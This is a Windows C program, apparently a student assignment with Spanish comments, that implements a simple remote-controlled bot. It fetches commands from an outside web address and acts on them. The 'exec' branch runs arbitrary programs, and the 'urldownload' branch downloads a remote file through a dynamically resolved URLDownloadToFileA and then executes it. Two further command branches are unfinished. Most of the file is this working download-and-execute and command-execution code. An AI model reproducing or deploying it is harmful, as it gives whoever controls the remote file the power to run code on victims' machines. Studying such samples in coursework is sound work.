// Herramientas -> Opciones de Compilación -> Añadir estos comandos a la línea de comandos del linker
// -lwininet

#include<windows.h>
#include<stdio.h>
#include<wininet.h>

#include<string.h>
 
int main(){
	// Parameters in the function prototype
	
    HINTERNET hInternetOpenSession, hFile;
	char lpBuffer[1024];
    DWORD numberOfBytesRead;
    int flag = 0;
    
    //section for urldownload
    HRESULT returnValue;
	// Function prototype, URLMON.URLDownloadToFileA
    typedef HRESULT(WINAPI *tURLDownloadToFileA)(LPUNKNOWN pCaller, LPCTSTR szURL, LPCTSTR szFileName, DWORD dwReserved, void *lpfnCB);
    tURLDownloadToFileA pURLDownloadToFileA;
	// Get address of the function from the specified dynamic-link library
    pURLDownloadToFileA = (tURLDownloadToFileA)GetProcAddress(LoadLibraryA("urlmon.dll"), "URLDownloadToFileA");
	
    
	// InternetOpen
    hInternetOpenSession = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0); // Type of access required
    if(hInternetOpenSession == NULL){
        printf("InternetOpen failed\n");
    }
	// InternetOpenUrl
    hFile = InternetOpenUrl(hInternetOpenSession, "http://www.hernandezchavez.net/jorge.log", 0, 0, INTERNET_NO_CALLBACK | INTERNET_FLAG_DONT_CACHE, 0);
    if(hFile == NULL){
        printf("InternetOpenUrl failed\n");
    }
	// InternetReadFile
    while(!flag){
        if(InternetReadFile(hFile, lpBuffer, sizeof(lpBuffer), &numberOfBytesRead)){
            if(numberOfBytesRead > 0){
                //En esta parte es donde comiensa el codigo y se siguen 
                //las instrucciones en el pdf del proyecto                
                char *foo;
                unsigned char res[100];
                //Funcion que copia lo que esta en el buffer y tenerlo como un arreglo de char
                memcpy(res,lpBuffer,sizeof(lpBuffer));
                foo = (char *)(lpBuffer);
                //Funciones para hacerl split
                //El delimitador solo es a que le queremos hacer split en este caso espacio
                char delimitador[] = " ";
                //guardamos la primera parte de la cadena
                char *token = strtok(res, delimitador);
                //Guardamos la segunda parte de la cadena
                char *path = strtok(NULL, delimitador);
                
                if(token != NULL)
                {
                    //Comenzamos con la estructura else if
                    //Ya que quermeos manejar los 5 ejercicios del proyecto
                    //Primer caso tenemos el comando exec
                    if(strcmp(token,"exec") == 0)
                    {
                        printf("lo hice %s\n",path);
                        printf("lo hice %s\n",token);
                        //Funcion recomendada en el pdf
                        //Se usa para ejecutar el Programa
                        //deseado que esta en la segunda parte de la cadena
                        WinExec((LPCSTR)path, SW_SHOWNORMAL);
                    //Segundo caso exit
                    }else if(strcmp(token,"exit") == 0){
                        printf("lo hice con\n%s",token);
                        //Simplemente sale con ambos comando solo es necesario 1
                        ExitProcess(1);
                        exit(0);
                    //Tercer caso urldownload
                    }else if(strcmp(token,"urldownload") == 0){
                        printf("lo hice con urldownload");
                        // CALL URLDownloadToFileA hacemos lo de la tarea de la semana 6
                        returnValue = pURLDownloadToFileA(0, path, "jhernandez.txt", 0, 0);
                        //Ejecutamos el archivo descargado 
                        WinExec((LPCSTR)"jhernandez.txt", SW_SHOWNORMAL);
                    //Cuarto caso File
                    }else if(strcmp(token,"file") == 0){
                        //resivimos una serie para convertir una cadena a un numero hexadecimal
                        //Para despues pasarla a binario.
                        unsigned int maskval = 0;
                        const char *number = path + 2;
                        //si hacemos esto sin ciclo solo me leia 2 caracteres
                        //Por eso se uso un while para leer la cadena completa
                        while(!isxdigit(*number))
                            number++;
                            if(sscanf(number, "%x", &maskval) == 1)
                                //mostramos el valor en vinario para ver que 
                                //Ehectivamente es un numero hexadecimal                            
                                printf("success, got %d\n", maskval);
                            else
                                printf("failed to parse '%s' as hexadecimal number\n", number);
                        
                        printf("lo hice con file");
                    //Quinto caso Sin implementar
                    }else if(strcmp(token,"reversetransposition") == 0){
                        printf("Lo hice con reverse transpotition");
                    }else{
                        printf("I can't do this i'm sorry");
                    
                    }
                }
                
            }
            else{
                flag = 1;
            }
        }
        else{
            printf("InternetReadFile failed\n");
            flag = 1;
        }
    }
    InternetCloseHandle(hInternetOpenSession);
    InternetCloseHandle(hFile);
    return 0;
}

// DOWNLOADING A WEB PAGE IN C USING WININET
// http://www.martinbroadhurst.com/downloading-a-web-page-in-c-using-wininet.html

// Downloading data via WinInet
// https://stackoverflow.com/questions/47486240/downloading-data-via-wininet
